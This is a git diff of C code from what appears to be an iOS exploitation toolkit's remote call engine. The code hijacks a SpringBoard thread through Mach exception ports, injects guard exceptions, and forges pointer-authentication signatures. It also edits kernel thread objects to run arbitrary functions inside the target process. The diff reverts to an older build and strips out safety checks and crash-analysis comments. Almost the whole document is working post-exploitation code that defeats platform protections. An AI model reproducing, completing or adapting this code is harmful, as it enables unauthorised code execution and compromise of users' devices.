-    if (!MACH_PORT_VALID(g_RC_secondExceptionPort)) {
-        RC_DIAG("EXC_GUARD park: secondExceptionPort invalid");
-        return false;
-    }
-
-    mach_exception_code_t guardCode = 0;
-    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
-    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
-    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);
-
-    if (!inject_guard_exception(targetThread, guardCode)) {
-        RC_DIAG("EXC_GUARD park: inject failed thread=0x%llx",
-                (unsigned long long)targetThread);
-        return false;
-    }
-    RC_DIAG("EXC_GUARD park: injected on 0x%llx — waiting secondExceptionPort",
-            (unsigned long long)targetThread);
-
-    ExceptionMessage exc;
-    int timeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0
-                  ? g_RC_stableExceptionTimeoutFloorMS : 10000;
-    if (!wait_exception(g_RC_secondExceptionPort, &exc, timeoutMS, false)) {
-        RC_DIAG("EXC_GUARD park: wait MISS timeout=%d — clearing guard", timeoutMS);
-        clear_guard_exception(targetThread);
-        return false;
-    }
-    clear_guard_exception(targetThread);
-
-    // Keep the trapped thread's own SP/FP/flags. Only PC/LR come from the
-    // pre-signed park state. Copying hijacked-main SP onto thread[1] is the
-    // 2026-09-26 IPS (set_state kr=0, getpid with sp=0).
-    arm_thread_state64_internal park = exc.threadState;
-    park.__pc = stateToInstall->__pc;
-    park.__lr = stateToInstall->__lr;
-    // x8 is the INDIRECT_RESULT address and means nothing to a parked thread.
-    // It arrives from whatever the callee was doing when it trapped, which is
-    // not a value this file chose and not one it can free.
-    park.__x[8] = 0;
-    RC_DIAG("EXC_GUARD park: trap SP=0x%llx FP=0x%llx install PC=0x%llx LR=0x%llx",
-            (unsigned long long)native_strip(park.__sp),
-            (unsigned long long)native_strip(park.__fp),
-            (unsigned long long)native_strip(park.__pc),
-            (unsigned long long)native_strip(park.__lr));
-
-    reply_with_state(&exc, &park);
-    RC_DIAG("EXC_GUARD park: reply sent — thread should sit at 0x301");
-    return true;
-}
-
 static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
-                                            const arm_thread_state64_internal *stateToInstall,
-                                            bool useMigFilterBypass)
-{
-    return park_remote_thread_via_exc_guard(targetThread, stateToInstall, useMigFilterBypass);
-}
-
-static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
-                                            const arm_thread_state64_internal *stateToInstall,
+                                            uint64_t signedPC,
+                                            uint64_t signedLR,
                                             bool useMigFilterBypass)
 {
     if (!is_kaddr_valid(targetThread)) {
         RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
-        return false;
-    }
-    if (!stateToInstall) {
-        RC_DIAG("TRO park: no state to install");
         return false;
     }
 
@@ -1541,13 +909,20 @@ static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
         return false;
     }
 
+    arm_thread_state64_internal park = {0};
+    park.__pc = signedPC;
+    park.__lr = signedLR;
+    park.__sp = g_RC_originalState.__sp;
+    park.__fp = g_RC_originalState.__fp;
+    park.__flags = g_RC_originalState.__flags;
+
     arm_thread_state64_internal *stateBuf =
-        (arm_thread_state64_internal *)malloc(sizeof(*stateToInstall));
+        (arm_thread_state64_internal *)malloc(sizeof(park));
     if (!stateBuf) {
         RC_DIAG("TRO park: malloc stateBuf failed");
         return false;
     }
-    memcpy(stateBuf, stateToInstall, sizeof(*stateToInstall));
+    memcpy(stateBuf, &park, sizeof(park));
 
     // Mark target as in-exception so set_state is accepted (same as wrapper).
     uint16_t options = thread_get_options(targetThread);
@@ -1587,17 +962,7 @@ static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
     return true;
 }
 
-// Returns false if the state could not be signed, and in that case the state
-// is left with the unsigned pc/lr in it and must NOT be replied to the target.
-//
-// This used to return void and assign the result unconditionally. remote_pac
-// signalled failure with -1, so a thread_create that failed inside it wrote
-// 0xFFFFFFFFFFFFFFFF into SpringBoard's __pc and the reply handed the target's
-// own thread a jump to nowhere. The comment on the state sanity check below
-// records that this exact shape, a bogus PC and SP, is what took SpringBoard
-// with SIGKILL on 2026-09-26. remote_pac now returns 0 on failure, which is the
-// reason this can tell the two apart.
-bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
 {
     reap_dead_port_names_if_needed("sign_state");
 
@@ -1607,11 +972,6 @@ bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
         uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
         uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
 
-        // Working 734a5e248 wrote the remote_pac result through unconditionally
-        // and had no failure return. Restored verbatim. When 5d0b6a/a8a15e added
-        // the "return false on a zero signature" rule, a signer that was late by
-        // microseconds stopped the call instead of sending it, and the session
-        // never got past bootstrap.
         if (pc) {
             uint32_t flags = state->__flags;
             flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
@@ -1625,14 +985,13 @@ bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
             state->__flags = flags;
             state->__lr = remote_pac(signingThread, lr, discLR);
         }
-        return true;
+        return;
     }
 
     if(!gIsPACSupported) {
         if (pc) state->__pc = pc;
         if (lr) state->__lr = lr;
     }
-    return true;
 }
 
 bool remote_call_current_success(void)
@@ -1650,94 +1009,11 @@ bool remote_call_uses_vphone_bridge(void)
     return g_RC_vphoneBridge;
 }
 
-// True when the thread that executes a remote call IS the target's main thread.
-//
-// Every call after init runs on the trojan thread, and the trojan thread is the
-// first thread in the task's list, which is the main thread. A caller that is
-// about to ask the main thread to do something must know this first: asking the
-// main thread to run a block and then waiting for it, while running on the main
-// thread, is a self deadlock. The main thread never returns to its runloop to
-// deliver the block, so the wait never ends, and backboardd kills SpringBoard
-// when the checkin goes stale.
-//
-// Logged on the device at the time of the kill, springboardd's report and the
-// main thread's own state:
-//     unresponsive dispatch queue(s): com.apple.main-thread
-//     60 seconds since last successful checkin
-//     thread 1552: mach_msg receive on port 0x73e840b4c063f347
-//     thread 1552: turnstile blocked on task pid 296, hops: 2
-//
-// A slow frame does not park the main thread in a mach message receive with a
-// turnstile block on this app's task. That is a deadlock and this is it.
-bool remote_call_runs_on_target_main_thread(void)
-{
-    if (g_RC_vphoneBridge) return false;
-    if (!g_RC_taskAddr || !g_RC_mainThreadAddr) return false;
-    // While the extra thread is bootstrapping, calls run on the synthetic call
-    // thread instead, and the main thread is parked, not executing anything.
-    if (g_RC_creatingExtraThread) return false;
-    return g_RC_trojanThreadAddr == g_RC_mainThreadAddr;
-}
-
 int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
 {
     int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
     g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
     return previous;
-}
-
-// Which thread of THIS process issued a remote call, and whether doing so means
-// the call is being made on SpringBoard's main thread.
-//
-// IPS 2026-09-30 17:00 (WATCHDOG, com.apple.main-thread) settled one thing and
-// refuted another: SpringBoard's main thread was NOT parked at 0x101/0x201/0x301/
-// 0x401. It was in a plain mach_msg receive with fifteen frames of real
-// SpringBoard code, which means it resumed and ran on its own. So the getpid
-// "never returns to 0x201" line breaks the overlay; it is not what killed the
-// board. What the report cannot say is who was holding the main thread.
-//
-// This records the caller, once per distinct (tid, name), because a publish
-// loop makes thousands of calls and a per-call logd line would drown the
-// console. The first sighting of a caller is the one that matters; after that
-// the count is the signal.
-static uint64_t g_rcCallerSeen[64] = {0};   // packed tid<<32 | name hash
-static int      g_rcCallerHits[64] = {0};
-static uint32_t g_rcCallerSlot = 0;
-static pthread_mutex_t g_rcCallerLock = PTHREAD_MUTEX_INITIALIZER;
-
-static void rc_log_caller(const char *what, const char *name, int viaStable)
-{
-    uint64_t tid = (uint64_t)pthread_mach_thread_np(pthread_self());
-    uint32_t h = 2166136261u;
-    for (const char *s = name ? name : ""; s && *s; s++) { h ^= (unsigned char)*s; h *= 16777619u; }
-    uint64_t key = (tid << 32) | (h & 0xffffffffu);
-
-    pthread_mutex_lock(&g_rcCallerLock);
-    int slot = -1;
-    for (int i = 0; i < 64; i++) {
-        if (g_rcCallerSeen[i] == key) { slot = i; break; }
-    }
-    int nth = 0;
-    if (slot < 0) {
-        slot = (int)(g_rcCallerSlot++ % 64u);
-        g_rcCallerSeen[slot] = key;
-        g_rcCallerHits[slot] = 0;
-    }
-    nth = ++g_rcCallerHits[slot];
-    pthread_mutex_unlock(&g_rcCallerLock);
-
-    // First sighting and the 1000th are both worth a line; the rest are not.
-    if (nth != 1 && nth != 1000 && nth != 10000)
-        return;
-
-    RC_DIAG("caller %s tid=0x%llx name=%s#%d onTargetMain=%d extra=%d success=%d",
-            what,
-            (unsigned long long)tid,
-            name ?: "?",
-            nth,
-            remote_call_runs_on_target_main_thread() ? 1 : 0,
-            g_RC_creatingExtraThread ? 1 : 0,
-            g_RC_success ? 1 : 0);
 }
 
 uint64_t do_remote_call_temp(int timeout, const char *name,
@@ -1751,48 +1027,10 @@ uint64_t do_remote_call_temp(int timeout, const char *name,
     return res;
 }
 
-// A thread this engine is driving sits at one of these two addresses and stays
-// there until it is replied to. Nothing else is a park.
-static bool rc_pc_is_park(uint64_t pc)
-{
-    return pc == FAKE_PC_TROJAN || pc == FAKE_LR_TROJAN;
-}
-
-// Put a faulted thread back on its park, and say whether it happened.
-//
-// The message has to be replied to either way. A thread still sitting in an
-// exception message whose reply right is gone never runs again, so every later
-// wait on that port is waiting for a thread that has already stopped.
-//
-// Only the stack comes across from the state that faulted. The registers in it
-// are whatever the callee had half-loaded, and republishing them is how a wild
-// pointer becomes the next call's arguments.
-static bool rc_repark_at(ExceptionMessage *exc, uint64_t parkLR)
-{
-    if (!exc)
-        return false;
-    arm_thread_state64_internal park = exc->threadState;
-    for (int i = 0; i <= 8; i++)
-        park.__x[i] = 0;
-    if (!sign_state(g_RC_trojanThreadAddr, &park, parkLR, parkLR)) {
-        RC_DIAG("re-park sign_state failed at 0x%llx — the thread stays in the exception",
-                (unsigned long long)parkLR);
-        return false;
-    }
-    reply_with_state(exc, &park);
-    return true;
-}
-
 uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
     uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
 {
-    // Working 734a5e248, body restored verbatim. The later step bookkeeping,
-    // the null-symbol refusal, the sign_state failure gate and the fault
-    // re-park all came after it and are gone again: that build drove SpringBoard
-    // with this exact sequence, and a8a15ead shows getpid still not returning
-    // to 0x201 with any of the additions in place.
-    rc_log_caller("temp", name, 0);
     int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
     int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
     uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
@@ -1831,14 +1069,7 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     exc.threadState.__x[5] = x5;
     exc.threadState.__x[6] = x6;
     exc.threadState.__x[7] = x7;
-    exc.threadState.__x[8] = g_RC_indirectResultPtr;
-    g_RC_indirectResultPtr = 0;
     sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
-    RC_DIAG("temp/%s signed PC=0x%llx LR=0x%llx flags=0x%x",
-            name ?: "?",
-            (unsigned long long)exc.threadState.__pc,
-            (unsigned long long)exc.threadState.__lr,
-            (unsigned)exc.threadState.__flags);
     reply_with_state(&exc, &exc.threadState);
 
     if (timeout < 0) {
@@ -1852,68 +1083,12 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
         g_RC_success = false;
         return 0;
     }
-    // exc/code/codeFirst/codeSecond are the discriminant this whole bug turns on.
-    // A bad-access from executing an unauthenticated PC and a PAC failure are
-    // different codes, and every log so far has printed only PC — so "the body
-    // ran" and "the ret auth failed" were both readings of the same line, and
-    // they cannot both be right. Log the type and the code before touching the
-    // state. Nothing about the behaviour changes.
-    RC_DIAG("temp/%s wait2 exc=0x%x code=0x%llx/0x%llx PC=0x%llx LR=0x%llx x0=0x%llx flags=0x%x",
+    RC_DIAG("temp/%s wait2 PC=0x%llx LR=0x%llx ret=0x%llx",
             name ?: "?",
-            (unsigned)exc2.exception,
-            (unsigned long long)exc2.codeFirst,
-            (unsigned long long)exc2.codeSecond,
             (unsigned long long)native_strip(exc2.threadState.__pc),
             (unsigned long long)native_strip(exc2.threadState.__lr),
-            (unsigned long long)exc2.threadState.__x[0],
-            (unsigned)exc2.threadState.__flags);
-
-    // Recorded HERE, on the temp path, which is where the create reads it.
-    //
-    // The assignment existed, but it had ended up in do_remote_call_stable_addr_internal
-    // instead — the stable path — while the check that reads it guards the create, and
-    // the create goes through do_remote_call_temp. So for every temp call the variable
-    // was 0, the check saw 0 rather than the fake link register, and abandoned the
-    // create. Every single time, deterministically, with a log that said so:
-    //
-    //   DIAG create did not return: retPC=0x0 expected=0x201
-    //
-    // retPC=0x0 is not a program counter. It is a variable nothing on this path ever
-    // wrote. The call had already returned — the create's own result was 0, which is
-    // pthread's success — and the check threw it away on a stale read.
-    //
-    // It sits directly under the line that already prints the same program counter, so
-    // the record and the report cannot come apart again.
-    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
-    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
-    g_RC_lastTempExcType = exc2.exception;
-    g_RC_lastTempExcCode = exc2.codeFirst;
-    g_RC_lastTempX0 = exc2.threadState.__x[0];
-
+            (unsigned long long)exc2.threadState.__x[0]);
     uint64_t retValue = exc2.threadState.__x[0];
-
-    // A call that came home left the thread executing the fake link register,
-    // because that is the address this engine returns to. Any other program
-    // counter means the callee never came home: it raised, and x0 in this state
-    // is whatever it had loaded, not an answer. Handing that register back as a
-    // return value is the defect; see the note at the stable path, which is
-    // where the springboardd abort came from. Same check, same reason.
-    if (native_strip(exc2.threadState.__pc) != FAKE_LR_TROJAN_CREATOR) {
-        RC_DIAG("temp/%s FAULT in the callee pc=0x%llx (a return lands on 0x%llx) — "
-                "0, not a register", name ?: "?",
-                (unsigned long long)native_strip(exc2.threadState.__pc),
-                (unsigned long long)FAKE_LR_TROJAN_CREATOR);
-        g_RC_lastTempStep = 24;
-        g_RC_success = false;
-        rc_repark_at(&exc2, FAKE_LR_TROJAN_CREATOR);
-        return 0;
-    }
-
-    // x8 cleared, same reason as the stable path: it is the INDIRECT_RESULT
-    // address, it means nothing after the callee returns, and whatever is in it
-    // now is a buffer the caller has already freed. Republishing it parks the
-    // thread holding a pointer to a released block.
-    exc2.threadState.__x[8] = 0;
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, false))
         printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
@@ -1929,20 +1104,18 @@ uint64_t do_remote_call_stable(int timeout, const char *name,
     uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
 {
     pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
-    uint64_t _ipcWait = 0;
-    const uint64_t _ipcT1 = rc_ipc_lock_measuring(&_ipcWait);
-    (void)_ipcWait;
+    pthread_mutex_lock(&g_universal_ipc_mutex);
     uint64_t res = 0;
     if (g_RC_vphoneBridge) {
         if (timeout >= 0)
             res = rc_vphone_bridge_call(2, 0, name, x0, x1, x2, x3, x4, x5, x6, x7);
-        rc_ipc_unlock_measuring(_ipcT1, name);
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
         return res;
     }
 
     if (!g_RC_creatingExtraThread) {
         res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
-        rc_ipc_unlock_measuring(_ipcT1, name);
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
         return res;
     }
 
@@ -1954,11 +1127,11 @@ uint64_t do_remote_call_stable(int timeout, const char *name,
     if (!pcAddr) {
         printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
         g_RC_success = false;
-        rc_ipc_unlock_measuring(_ipcT1, name);
+        pthread_mutex_unlock(&g_universal_ipc_mutex);
         return 0;
     }
     res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
-    rc_ipc_unlock_measuring(_ipcT1, name);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
     return res;
 }
 
@@ -1967,11 +1140,9 @@ uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *na
     uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
 {
     pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
-    uint64_t _ipcWait = 0;
-    const uint64_t _ipcT1 = rc_ipc_lock_measuring(&_ipcWait);
-    (void)_ipcWait;
+    pthread_mutex_lock(&g_universal_ipc_mutex);
     uint64_t res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
-    rc_ipc_unlock_measuring(_ipcT1, name);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
     return res;
 }
 
@@ -1990,55 +1161,8 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
         return rc_vphone_bridge_call(3, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
     }
 
-    rc_log_caller("stable", name, 1);
     if (!g_RC_creatingExtraThread)
         return 0;
-
-    // The session gate.
-    //
-    // The transport is one hijacked thread in one target process, driven through
-    // two exception ports. Its phase with that thread is global, and every failure
-    // path below destroys it in a way nothing here can repair: a callee fault is
-    // republished at 0x401, which is the same address a return lands on, so wait1
-    // can no longer tell a park from the previous call's return; a wait2 that gives
-    // up leaves the call unreplied and the thread running code nobody is counting.
-    // Each of those paths sets g_RC_success = false, and each says in its comment
-    // that the caller must abandon or re-initialise. Nothing implemented that,
-    // so the next call went straight out on the broken transport.
-    //
-    // 2026-09-30 21:50:33 device log, this gate absent. The callee faulted:
-    //   stable/objc_msgSend FAULT in the callee pc=0x18c73f020 ... reparked
-    //   caller stable tid=0x2103 name=object_getClass#1 ... success=0
-    // and the next call was issued in the same second:
-    //   stable/objc_msgSend wait1 begin timeout=10000        (alloc)
-    //   [PUSH][SB-LAST] r_msg_main_raw sel=initWithWindowScene: wait=1
-    //   [PUSH][SB-LAST] r_msg_main_raw sel=setWindowLevel: wait=1
-    //   ... 21:50:35 [PUSH][SB-LAST] r_msg_main_raw sel=addSublayer: wait=1
-    //   21:50:45 stable/objc_msgSend wait2 TIMEOUT
-    //   21:50:45 [RC-SLOW] call=objc_msgSend held=10038ms tid=8451
-    // and one second after that the next call was issued too and never came back.
-    //
-    // SpringBoard-2026-09-30-215137.ips is the result, 46 seconds later:
-    //   pid 34 thread 1551 com.apple.main-thread
-    //     "turnstile blocked on task pid 326, hops: 2, priority: 47"
-    //     60 seconds since last successful checkin -> WATCHDOG
-    // and in the same report, pid 326:
-    //   thread 5639 com.apple.root.utility-qos
-    //     turnstileInfo "thread 5639: turnstile has unknown inheritor"
-    //     waitInfo "mach_msg receive on port 0xff37fe3d7354cbcf name 0x4c2b"
-    // A caller of ours sat in the exception port with SpringBoard's main thread
-    // queued behind it, and nothing ever drained.
-    //
-    // The teardown already applies this exact rule to the one call it makes, at
-    // the pthread_exit below: "A session that has already failed is the common
-    // case here, and issuing a remote call on it is issuing a call whose reply
-    // nobody can trust." It belongs on every call, not only the last one.
-    if (!g_RC_success && !g_RC_teardownCall) {
-        RC_DIAG("stable/%s refused, session already failed (step=%d) — port untouched",
-                name ?: "(addr-call)", (int)g_RC_lastTempStep);
-        g_RC_lastTempStep = 25;
-        return 0;
-    }
 
     if (!pcAddr) {
         printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
@@ -2050,39 +1174,18 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
     int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
     int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
 
-    g_rcW1Sender = 0;
-    g_rcW1Pc = 0;
-
     ExceptionMessage exc;
     RC_DIAG("stable/%s wait1 begin timeout=%d", name ?: "(addr-call)", newTimeout);
-    const uint64_t tW1 = remote_call_diag_now_us();
-    const bool got1 = wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false);
-    g_rcWait1US += remote_call_diag_now_us() - tW1;
-    if (remote_call_diag_now_us() - tW1 > g_rcWait1MaxUS) {
-        g_rcWait1MaxUS = remote_call_diag_now_us() - tW1;
-    }
-    if (!got1) {
-        g_rcWait1TO++;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
         RC_DIAG("stable/%s wait1 TIMEOUT (new thread didn't hit 0x301 park?)", name ?: "(addr-call)");
         printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
-        g_RC_lastTempStep = 20;
         g_RC_success = false;
         return 0;
     }
-    RC_DIAG("stable/%s wait1 caught exc=0x%x code=0x%llx/0x%llx PC=0x%llx LR=0x%llx (expect 0x301)",
+    RC_DIAG("stable/%s wait1 caught PC=0x%llx LR=0x%llx (expect 0x301)",
             name ?: "(addr-call)",
-            (unsigned)exc.exception,
-            (unsigned long long)exc.codeFirst,
-            (unsigned long long)exc.codeSecond,
             (unsigned long long)native_strip(exc.threadState.__pc),
             (unsigned long long)native_strip(exc.threadState.__lr));
-    // Who replied to, and who is it that then faulted. If a fault arriving on
-    // the first port carries the same sender as this park message, the thread
-    // that took the call is the one that crashed, and the exception port it
-    // faults to is not the one the call waits on. If the senders differ, the
-    // crash belongs to a different injected thread entirely.
-    g_rcW1Sender = exc.Head.msgh_remote_port;
-    g_rcW1Pc = native_strip(exc.threadState.__pc);
 
     // This is the guard that saved SpringBoard on 2026-09-26: the port handed us
     // an all-zero state, and we used to sign pc=<real fn>/lr=0x401 onto it and
@@ -2095,26 +1198,7 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
                 (unsigned long long)native_strip(exc.threadState.__pc),
                 (unsigned long long)native_strip(exc.threadState.__sp),
                 (unsigned)exc.flavor);
-        g_RC_lastTempStep = 3;
         g_RC_success = false;
-        return 0;
-    }
-
-    // wait1 is written to read the thread's park. This one carried a program
-    // counter inside real code instead, which is a fault that got in ahead of
-    // the park — the previous call's callee raised and left its message sitting
-    // in the port. Replying with this call's own PC onto that state would
-    // resume the thread in the middle of whatever raised, so park it instead and
-    // report the call as not issued. The device log at 2026-09-30 18:24:07 is
-    // this line firing:
-    //   stable/objc_msgSend wait1 caught ... PC=0x195edf020 LR=0x401 (expect 0x301)
-    if (!rc_pc_is_park(native_strip(exc.threadState.__pc))) {
-        RC_DIAG("stable/%s wait1 got a fault, not a park (pc=0x%llx) — reparking, "
-                "call not issued", name ?: "(addr-call)",
-                (unsigned long long)native_strip(exc.threadState.__pc));
-        g_RC_lastTempStep = 22;
-        g_RC_success = false;
-        rc_repark_at(&exc, FAKE_LR_TROJAN);
         return 0;
     }
 
@@ -2126,29 +1210,10 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
     exc.threadState.__x[5] = x5;
     exc.threadState.__x[6] = x6;
     exc.threadState.__x[7] = x7;
-    exc.threadState.__x[8] = g_RC_indirectResultPtr;
-    g_RC_indirectResultPtr = 0;
     // Cyanide/Fl0rk: ALWAYS sign with trojanThreadAddr (PAC gadget context),
     // even though the exception arrives on the synthetic call thread.
     // Signing with callThreadAddr produced uncatchable RET→0x401 SIGBUS.
-    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN)) {
-        // No reply. The target's thread stays parked in the exception and
-        // nothing bogus is ever written into its PC, and the caller is told the
-        // session is finished so it re-initialises instead of pushing another
-        // call through a wedged thread.
-        RC_DIAG("sign_state failed, abandoning without a reply (name=%s)", name ? name : "?");
-        g_RC_lastTempStep = 19;
-        g_RC_success = false;
-        // No unlock here. do_remote_call_stable and do_remote_call_stable_addr
-        // both took g_universal_ipc_mutex before calling in, and both unlock it
-        // on the way out. Unlocking in here as well is a second unlock of a
-        // recursive mutex: the count goes negative, the mutex is released while
-        // the wrapper still believes it holds it, and a second thread walks into
-        // the transport. That is the 51-second gap in the 2026-09-30 17:23 log —
-        // one call timed out, the next thread got in immediately and read a port
-        // nobody was driving, so every wait from there on was a 10s timeout.
-        return 0;
-    }
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
     reply_with_state(&exc, &exc.threadState);
 
     if (timeout < 0) {
@@ -2158,132 +1223,22 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
 
     ExceptionMessage exc2;
     RC_DIAG("stable/%s wait2 begin", name ?: "(addr-call)");
-    const uint64_t tW2 = remote_call_diag_now_us();
-    const bool got2 = wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false);
-    const uint64_t w2 = remote_call_diag_now_us() - tW2;
-    g_rcWait2US += w2;
-    if (w2 > g_rcWait2MaxUS) g_rcWait2MaxUS = w2;
-    if (!got2) {
-        g_rcWait2TO++;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
         RC_DIAG("stable/%s wait2 TIMEOUT", name ?: "(addr-call)");
         printf("[%s:%d] Don't receive second exception on new thread (name=%s) — repark\n",
                __FUNCTION__, __LINE__, name ?: "(addr-call)");
-        // What is known for certain here: the call thread took the work, was
-        // replied to, and never came back. Both messages this line reports were
-        // genuinely received on the second port, so reading them costs nothing
-        // and destroys nothing.
-        //
-        // What used to be here, and why it is gone: a probe of the first port to
-        // see whether a message from some other thread had piled up on it. That
-        // probe found the cause, EXC_BAD_ACCESS on a port with no consumer, and
-        // init now hands those threads back, so the port should have no traffic
-        // at all. Probing it again is not possible without a primitive that
-        // does not link: mach_msg_peek is not exported by libSystem on iOS, and
-        // receiving-then-resending trades a clean failure for one where a
-        // failed re-send loses the message and strands the thread. borrowed
-        // says how many threads init gave back, so a nonzero count here means
-        // the release did not take.
-        g_RC_lastTempStep = 21;
-        g_RC_lastTempRetPC_raw = 0;
-        g_RC_lastTempRetPC = 0;
-        g_RC_lastTempExcType = 0;
-        g_RC_lastTempExcCode = 0;
-        g_RC_lastTempX0 = 0;
-        g_rcW2Stray = g_rcBorrowedReleased ? 1 : 2;
-        NSLog(@"[RC-W2TO] %s: no return, call pc=0x%llx w1snd=0x%x w1pc=0x%llx "
-              @"borrowed=%llu released=%llu kept=%llu",
-              name ?: "?", (unsigned long long)pcAddr,
-              (unsigned)g_rcW1Sender, (unsigned long long)g_rcW1Pc,
-              (unsigned long long)g_rcBorrowedTotal,
-              (unsigned long long)g_rcBorrowedReleased,
-              (unsigned long long)g_rcBorrowedKept);
         // Best-effort: thread may be wedged at FAKE_LR. Mark failed; caller must
         // abandon/reinit. Leaving success=false prevents further publishes.
         g_RC_success = false;
         return 0;
     }
     uint64_t retValue = exc2.threadState.__x[0];
-    // exc/code/codeFirst/codeSecond are the discriminant. A return into 0x401 and
-    // a bad access raised while still inside the callee both land here, and the
-    // 2026-09-30 17:23 log recorded PC=0x18524f020 with LR=0x401 — a real
-    // address inside objc_msgSend, not the fake link register — while printing
-    // only the PC. That line cannot tell those apart, and the difference decides
-    // whether the answer is "the call returned" or "the call faulted and x0 is
-    // whatever it had loaded". The temp path logs this; this path did not.
-    RC_DIAG("stable/%s wait2 exc=0x%x code=0x%llx/0x%llx PC=0x%llx LR=0x%llx x0=0x%llx flags=0x%x",
+    RC_DIAG("stable/%s wait2 caught PC=0x%llx LR=0x%llx ret=0x%llx",
             name ?: "(addr-call)",
-            (unsigned)exc2.exception,
-            (unsigned long long)exc2.codeFirst,
-            (unsigned long long)exc2.codeSecond,
             (unsigned long long)native_strip(exc2.threadState.__pc),
             (unsigned long long)native_strip(exc2.threadState.__lr),
-            (unsigned long long)retValue,
-            (unsigned)exc2.threadState.__flags);
-    // Recorded here as well, and for the reason the temp path records it. The
-    // report prints a program counter, an exception type and x0, and on this path
-    // all three were carried over from whichever temp call ran last. So a failure
-    // of the very first stable call was being described in terms of a fault that
-    // had already been dealt with, and a reader had no way to know that.
-    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
-    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
-    g_RC_lastTempExcType = exc2.exception;
-    g_RC_lastTempExcCode = exc2.codeFirst;
-    g_RC_lastTempX0 = exc2.threadState.__x[0];
-    // A call that came home left the thread executing FAKE_LR_TROJAN, because
-    // that is the address this engine returns to. Any other program counter here
-    // means the callee never came home: it raised, and the x0 printed above is
-    // whatever it had loaded, not an answer.
-    //
-    // Returning that register is what killed SpringBoard. 2026-09-30 18:41:19
-    // IPS, pid 518, uptime 16 minutes, SIGABRT:
-    //
-    //   -[BKSHIDEventDeferringToken setTarget:]: unrecognized selector
-    //       sent to instance 0x3019a7ae0
-    //   doesNotRecognizeSelector: / ___forwarding___ / _CF_forwarding_prep_0,
-    //   then four frames at libsystem_pthread + 0x401 and thread_start
-    //
-    // 0x401 is FAKE_LR_TROJAN, so the thread that threw was the synthetic call
-    // thread. 0x3019a7ae0 sits in the 0x30_xxxx_xxxx range, which is the range
-    // the device log has a faulting objc_msgSend reporting in x0 on two separate
